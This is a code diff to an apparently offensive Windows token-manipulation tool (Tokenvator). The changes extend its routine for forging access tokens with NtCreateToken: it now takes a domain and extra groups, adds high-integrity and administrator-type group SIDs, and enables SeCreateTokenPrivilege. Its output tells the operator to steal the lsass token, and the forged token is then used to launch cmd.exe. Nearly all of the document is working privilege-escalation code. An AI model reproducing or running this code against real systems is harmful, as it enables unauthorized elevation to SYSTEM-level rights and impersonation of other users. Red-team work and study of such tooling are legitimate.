@@ -9,6 +9,7 @@ using Tokenvator.Plugins.Enumeration;
 
 using MonkeyWorks.Unmanaged.Headers;
 using MonkeyWorks.Unmanaged.Libraries;
+using System.Security.Principal;
 
 namespace Tokenvator.Plugins.AccessTokens
 {
@@ -26,11 +27,16 @@ namespace Tokenvator.Plugins.AccessTokens
 
         public CreateTokens(IntPtr token) : base(token)
         {
-
+            SetWorkingTokenToSelf();
         }
 
-        public void CreateToken()
+        public void CreateToken(string[] groups)
         {
+            if (!_CheckPrivileges())
+            {
+                return;
+            }
+
             IntPtr hToken = Marshal.AllocHGlobal(Marshal.SizeOf(typeof(IntPtr)));
             Console.WriteLine("Token Handle: 0x{0}", hToken.ToString("X4"));
 
@@ -101,14 +107,14 @@ namespace Tokenvator.Plugins.AccessTokens
         }
 
         //SeCreateTokenPrivilege
-        //SeTcbPrivilege
-        public void CreateToken(string userName)
+        public void CreateToken(string userName, string[] groups)
         {
-            Console.WriteLine("Creating Token for {0}", userName);
+            Console.WriteLine("[*] Creating Token for {0}", userName);
 
-            IntPtr hToken = Marshal.AllocHGlobal(Marshal.SizeOf(typeof(IntPtr)));
-            Console.WriteLine("Token Handle: 0x{0}", hToken.ToString("X4"));
-
+            if (!_CheckPrivileges())
+            {
+                return;
+            }
             
             uint MAX_PREFERRED_LENGTH = 0xFFFFFFFF;
 
@@ -138,39 +144,29 @@ namespace Tokenvator.Plugins.AccessTokens
             };
             #endregion
 
-            uint ntRetVal;
-            /*
-            TokenInformation ti = new TokenInformation(hWorkingToken);
-            ti.GetTokenSource();
-            ti.GetTokenUser();
-            ti.GetTokenGroups();
-            ti.GetTokenPrivileges();
-            ti.GetTokenOwner();
-            ti.GetTokenPrimaryGroup();
-            ti.GetTokenDefaultDacl();
-            Console.WriteLine(new string('=',80));
-            */
+            string domain = Environment.MachineName;
+            if (userName.Contains(@"\"))
+            {
+                string[] split = userName.Split('\\');
+                domain = split[0];
+                userName = split[1];
+            }
 
             Winnt._LUID systemLuid = Winnt.SYSTEM_LUID;
             long expirationTime = long.MaxValue / 2;
-            CreateTokenUser(userName, out Ntifs._TOKEN_USER tokenUser);
-            CreateTokenGroups(userName, out Ntifs._TOKEN_GROUPS tokenGroups, out Winnt._TOKEN_PRIMARY_GROUP tokenPrimaryGroup);
+            CreateTokenUser(domain, userName, out Ntifs._TOKEN_USER tokenUser);
+            CreateTokenGroups(domain, userName, out Ntifs._TOKEN_GROUPS tokenGroups, out Winnt._TOKEN_PRIMARY_GROUP tokenPrimaryGroup, groups);
             CreateTokenPrivileges(tokenUser, tokenGroups, out Winnt._TOKEN_PRIVILEGES_ARRAY tokenPrivileges);
-            CreateTokenOwner(userName, out Ntifs._TOKEN_OWNER tokenOwner);
+            CreateTokenOwner(domain, userName, out Ntifs._TOKEN_OWNER tokenOwner);
             //CreateTokenPrimaryGroup(primaryGroup, out Winnt._TOKEN_PRIMARY_GROUP tokenPrimaryGroup);
             CreateTokenDefaultDACL(out Winnt._TOKEN_DEFAULT_DACL tokenDefaultDacl);
             CreateTokenSource(out Winnt._TOKEN_SOURCE tokenSource);
-            
-            /*
-            PrintStruct(ti.tokenPrimaryGroup);
-            PrintStruct(ti.tokenPrimaryGroup.PrimaryGroup);
-            PrintStruct(tokenPrimaryGroup);
-            PrintStruct(tokenPrimaryGroup.PrimaryGroup);
-            */
-            
+
+            IntPtr hToken = Marshal.AllocHGlobal(Marshal.SizeOf(typeof(IntPtr)));
+
             //out/ref hToken - required
             //Ref Expirationtime - required
-            ntRetVal = ntdll.NtCreateToken(
+            uint ntRetVal = ntdll.NtCreateToken(
                 out hToken,
                 Winnt.TOKEN_ALL_ACCESS,
                 ref objectAttributes,
@@ -189,8 +185,9 @@ namespace Tokenvator.Plugins.AccessTokens
             if (0 != ntRetVal)
             {
                 Misc.GetNtError("NtCreateToken", ntRetVal);
-                new TokenInformation(hToken).GetTokenUser();
+                return;
             }
+
             phNewToken = hToken;
 
             Console.WriteLine();
@@ -198,19 +195,77 @@ namespace Tokenvator.Plugins.AccessTokens
             DesktopACL desktop = new DesktopACL();
             desktop.OpenDesktop();
             desktop.OpenWindow();
-            //desktop.UpdateSecurityDacl(hToken);
 
             Console.WriteLine();
 
             StartProcessAsUser("cmd.exe");         
         }
 
-        private bool CreateTokenUser(string userName, out Ntifs._TOKEN_USER tokenUser)
+        private bool _CheckPrivileges()
+        {
+            TokenInformation.CheckTokenPrivilege(hWorkingToken, Winnt.SE_CREATETOKEN_NAME, out bool exists, out bool enabled);
+            if (!exists)
+            {
+                Console.WriteLine("[-] {0} is not present on the token", Winnt.SE_CREATETOKEN_NAME);
+                Console.WriteLine("[-] Steal_Token lsass cmd.exe");
+                Console.WriteLine("[-] Add_Privilege SeCreateTokenPrivilege");
+                return false;
+            }
+
+            if (!enabled)
+            {
+                Console.WriteLine("[-] {0} is not enabled on the token", Winnt.SE_CREATETOKEN_NAME);
+                Console.WriteLine("[*] Enabling {0} on the token", Winnt.SE_CREATETOKEN_NAME);
+                using (TokenManipulation tm = new TokenManipulation(hWorkingToken))
+                {
+                    tm.SetWorkingTokenToSelf();
+                    if (!tm.SetTokenPrivilege(Winnt.SE_CREATETOKEN_NAME, Winnt.TokenPrivileges.SE_PRIVILEGE_ENABLED))
+                    {
+                        return false;   
+                    }
+                }
+            }
+            else
+            {
+                Console.WriteLine("[+] {0} is present and enabled on the token", Winnt.SE_CREATETOKEN_NAME);
+            }
+
+            TokenInformation.CheckTokenPrivilege(hWorkingToken, Winnt.SE_SECURITY_NAME, out exists, out enabled);
+            if (!exists)
+            {
+                Console.WriteLine("[-] {0} is not present on the token", Winnt.SE_SECURITY_NAME);
+                Console.WriteLine("[-] This should be present on existing high integrity tokens");
+                Console.WriteLine("[-] Add_Privilege SeCreateTokenPrivilege");
+                return false;
+            }
+
+            if (!enabled)
+            {
+                Console.WriteLine("[-] {0} is not enabled on the token", Winnt.SE_SECURITY_NAME);
+                Console.WriteLine("[*] Enabling {0} on the token", Winnt.SE_SECURITY_NAME);
+                using (TokenManipulation tm = new TokenManipulation(hWorkingToken))
+                {
+                    tm.SetWorkingTokenToSelf();
+                    if (!tm.SetTokenPrivilege(Winnt.SE_SECURITY_NAME, Winnt.TokenPrivileges.SE_PRIVILEGE_ENABLED))
+                    {
+                        return false;
+                    }
+                }
+            }
+            else
+            {
+                Console.WriteLine("[+] {0} is present and enabled on the token", Winnt.SE_CREATETOKEN_NAME);
+            }
+
+            return true;
+        }
+
+        private bool CreateTokenUser(string domain, string userName, out Ntifs._TOKEN_USER tokenUser)
         {
             Console.WriteLine("[*] Creating _TOKEN_USER");
             tokenUser = new Ntifs._TOKEN_USER();
             IntPtr hUserSid = IntPtr.Zero;
-            if (!_LookupSid(string.Empty, userName, ref hUserSid))
+            if (!_LookupSid(domain, userName, ref hUserSid))
             {
                 return false;
             }
@@ -220,7 +275,7 @@ namespace Tokenvator.Plugins.AccessTokens
             return true;
         }
 
-        private bool CreateTokenGroups(string userName, out Ntifs._TOKEN_GROUPS tokenGroups, out Winnt._TOKEN_PRIMARY_GROUP tokenPrimaryGroup)
+        private bool CreateTokenGroups(string domain, string userName, out Ntifs._TOKEN_GROUPS tokenGroups, out Winnt._TOKEN_PRIMARY_GROUP tokenPrimaryGroup, string[] groups)
         {
             uint LG_INCLUDE_INDIRECT = 0x0001;
 
@@ -235,7 +290,7 @@ namespace Tokenvator.Plugins.AccessTokens
 
             lmaccess._LOCALGROUP_USERS_INFO_0[] localgroupUserInfo = new lmaccess._LOCALGROUP_USERS_INFO_0[0];
             uint ntRetVal = netapi32.NetUserGetLocalGroups(
-                null,
+                domain,
                 userName.ToLower(),
                 0,
                 LG_INCLUDE_INDIRECT,
@@ -266,10 +321,10 @@ namespace Tokenvator.Plugins.AccessTokens
 
             #region NetUserGetGroups
             //Console.WriteLine(" - NetUserGetGroups");
-            lmaccess._GROUP_USERS_INFO_0[] globalGroupUserInfo = new lmaccess._GROUP_USERS_INFO_0[0];
+            lmaccess._GROUP_USERS_INFO_0[] globalGroupUserInfo;// = new lmaccess._GROUP_USERS_INFO_0[0];
             ntRetVal = netapi32.NetUserGetGroups(
-                string.Empty,
-                userName,
+                domain,
+                userName.ToLower(),
                 0,
                 out bufPtr,
                 -1,
@@ -304,68 +359,64 @@ namespace Tokenvator.Plugins.AccessTokens
             //Everyone
             _InitializeSid(Winnt.SECURITY_WORLD_SID_AUTHORITY, new uint[] { 0, 0, 0, 0, 0, 0, 0, 0 }, ref tokenGroups.Groups[0].Sid);
             tokenGroups.Groups[0].Attributes = groupsAttributes;
-
-            //Local
-            _InitializeSid(Winnt.SECURITY_LOCAL_SID_AUTHORITY, new uint[] { 0, 0, 0, 0, 0, 0, 0, 0 }, ref tokenGroups.Groups[1].Sid);
-            tokenGroups.Groups[1].Attributes = groupsAttributes;
-
-            //Interactive Users
-            _InitializeSid(Winnt.SECURITY_NT_AUTHORITY, new uint[] { (uint)Winnt.SECURITY_INTERACTIVE_RID, 0, 0, 0, 0, 0, 0, 0 }, ref tokenGroups.Groups[2].Sid);
-            tokenGroups.Groups[2].Attributes = groupsAttributes;
-
-            //Authenticated Users
-            _InitializeSid(Winnt.SECURITY_NT_AUTHORITY, new uint[] { (uint)Winnt.SECURITY_AUTHENTICATED_USER_RID, 0, 0, 0, 0, 0, 0, 0 }, ref tokenGroups.Groups[3].Sid);
-            tokenGroups.Groups[3].Attributes = groupsAttributes;
-
-            //Console Logon
-            _InitializeSid(Winnt.SECURITY_LOCAL_SID_AUTHORITY, new uint[] { 1, 0, 0, 0, 0, 0, 0, 0 }, ref tokenGroups.Groups[4].Sid);
-            tokenGroups.Groups[4].Attributes = groupsAttributes;
-
-            //This Organization
-            _InitializeSid(Winnt.SECURITY_NT_AUTHORITY, new uint[] { (uint)Winnt.SECURITY_THIS_ORGANIZATION_RID, 0, 0, 0, 0, 0, 0, 0 }, ref tokenGroups.Groups[5].Sid);
-            tokenGroups.Groups[5].Attributes = groupsAttributes;
             */
 
             //Console.WriteLine("[+] Extra Groups");
             //Everyone
-            _InitializeSid("S-1-1-0", ref tokenGroups.Groups[extraGroups].Sid);
+            InitializeSid("S-1-1-0", ref tokenGroups.Groups[extraGroups].Sid);
             tokenGroups.Groups[extraGroups++].Attributes = groupsAttributes;
 
             //Administrators - Make this a flag
-            _InitializeSid("S-1-5-114", ref tokenGroups.Groups[extraGroups].Sid);
+            InitializeSid("S-1-5-114", ref tokenGroups.Groups[extraGroups].Sid);
             tokenGroups.Groups[extraGroups++].Attributes = groupsAttributes;
 
             //INTERACTIVE
-            _InitializeSid("S-1-5-4", ref tokenGroups.Groups[extraGroups].Sid);
+            InitializeSid("S-1-5-4", ref tokenGroups.Groups[extraGroups].Sid);
             tokenGroups.Groups[extraGroups++].Attributes = groupsAttributes;
 
             //CONSOLE LOGON
-            _InitializeSid("S-1-2-1", ref tokenGroups.Groups[extraGroups].Sid);
+            InitializeSid("S-1-2-1", ref tokenGroups.Groups[extraGroups].Sid);
             tokenGroups.Groups[extraGroups++].Attributes = groupsAttributes;
 
             //Authenticated Users
-            _InitializeSid("S-1-5-11", ref tokenGroups.Groups[extraGroups].Sid);
+            InitializeSid("S-1-5-11", ref tokenGroups.Groups[extraGroups].Sid);
             tokenGroups.Groups[extraGroups++].Attributes = groupsAttributes;
 
             //This Organization
-            _InitializeSid("S-1-5-15", ref tokenGroups.Groups[extraGroups].Sid);
+            InitializeSid("S-1-5-15", ref tokenGroups.Groups[extraGroups].Sid);
             tokenGroups.Groups[extraGroups++].Attributes = groupsAttributes;
 
             //Local account
-            _InitializeSid("S-1-5-113", ref tokenGroups.Groups[extraGroups].Sid);
+            InitializeSid("S-1-5-113", ref tokenGroups.Groups[extraGroups].Sid);
             tokenGroups.Groups[extraGroups++].Attributes = groupsAttributes;
 
             //LOCAL
-            _InitializeSid("S-1-2-0", ref tokenGroups.Groups[extraGroups].Sid);
+            InitializeSid("S-1-2-0", ref tokenGroups.Groups[extraGroups].Sid);
             tokenGroups.Groups[extraGroups++].Attributes = groupsAttributes;
 
             //NTLM Authentication
-            _InitializeSid("S-1-5-64-10", ref tokenGroups.Groups[extraGroups].Sid);
+            InitializeSid("S-1-5-64-10", ref tokenGroups.Groups[extraGroups].Sid);
             tokenGroups.Groups[extraGroups++].Attributes = groupsAttributes;
 
             //High Integrity Token
-            _InitializeSid("S-1-16-12288", ref tokenGroups.Groups[extraGroups].Sid);
+            InitializeSid("S-1-16-12288", ref tokenGroups.Groups[extraGroups].Sid);
             tokenGroups.Groups[extraGroups++].Attributes = groupsAttributes;
+
+            //Custom groups
+            foreach (string group in groups)
+            {
+                string d = Environment.MachineName;
+                string groupname = group;
+                if (group.Contains(@"\"))
+                {
+                    string[] split = group.Split('\\');
+                    d = split[0];
+                    groupname = split[1];
+                }
+                string sid = new NTAccount(d, groupname).Translate(typeof(SecurityIdentifier)).Value;
+                InitializeSid(sid, ref tokenGroups.Groups[extraGroups].Sid);
+                tokenGroups.Groups[extraGroups++].Attributes = groupsAttributes;
+            }
             #endregion 
 
             #region Local & Global Entries
@@ -474,12 +525,12 @@ namespace Tokenvator.Plugins.AccessTokens
             return true;
         }
 
-        private bool CreateTokenOwner(string userName, out Ntifs._TOKEN_OWNER tokenOwner)
+        private bool CreateTokenOwner(string domain, string userName, out Ntifs._TOKEN_OWNER tokenOwner)
         {
             Console.WriteLine("[*] _TOKEN_OWNER");
             tokenOwner = new Ntifs._TOKEN_OWNER();
             IntPtr hOwnerSid = IntPtr.Zero;
-            if (!_LookupSid(string.Empty, userName, ref hOwnerSid))
+            if (!_LookupSid(domain, userName, ref hOwnerSid))
             {
                 return false;
             }
@@ -507,7 +558,7 @@ namespace Tokenvator.Plugins.AccessTokens
             {
                 //Everyone
                 //Winnt.SECURITY_NULL_SID_AUTHORITY
-                //_InitializeSid(Winnt.SECURITY_NT_AUTHORITY, new uint[] { 32, 544, 0, 0, 0, 0, 0, 0 }, ref tokenPrimaryGroup.PrimaryGroup);
+                //InitializeSid(Winnt.SECURITY_NT_AUTHORITY, new uint[] { 32, 544, 0, 0, 0, 0, 0, 0 }, ref tokenPrimaryGroup.PrimaryGroup);
             }
             return true;
         }
@@ -658,7 +709,7 @@ namespace Tokenvator.Plugins.AccessTokens
         ////////////////////////////////////////////////////////////////////////////////
         // Wrapper for AllocateAndInitializeSid - Hardest Possible way of doing it
         ////////////////////////////////////////////////////////////////////////////////
-        private static bool _InitializeSid(Winnt._SID_IDENTIFIER_AUTHORITY authority, uint[] subAuthority, ref IntPtr psid)
+        private static bool InitializeSid(Winnt._SID_IDENTIFIER_AUTHORITY authority, uint[] subAuthority, ref IntPtr psid)
         {
             //Console.WriteLine("AllocateAndInitializeSid");
             bool retVal = advapi32.AllocateAndInitializeSid(
@@ -701,7 +752,7 @@ namespace Tokenvator.Plugins.AccessTokens
         ////////////////////////////////////////////////////////////////////////////////
         // Wrapper for AllocateAndInitializeSid
         ////////////////////////////////////////////////////////////////////////////////
-        private static bool _InitializeSid(string sddl, ref IntPtr psid)
+        public static bool InitializeSid(string sddl, ref IntPtr psid)
         {
             bool retVal = advapi32.ConvertStringSidToSidW(sddl, ref psid);
 
@@ -724,20 +775,6 @@ namespace Tokenvator.Plugins.AccessTokens
 
             //Console.WriteLine(" [+] {0} {1}", sddl, accountName);
             return true;
-        }
-
-        ////////////////////////////////////////////////////////////////////////////////
-        // Print a struct
-        ////////////////////////////////////////////////////////////////////////////////
-        public static void PrintStruct<T>(T printMe)
-        {
-            System.Reflection.FieldInfo[] fields = printMe.GetType().GetFields();
-            Console.WriteLine("==========");
-            foreach (var xInfo in fields)
-            {
-                Console.WriteLine("Field    {0}", xInfo.GetValue(printMe).ToString());
-            }
-            Console.WriteLine("==========");
         }
     }
 }
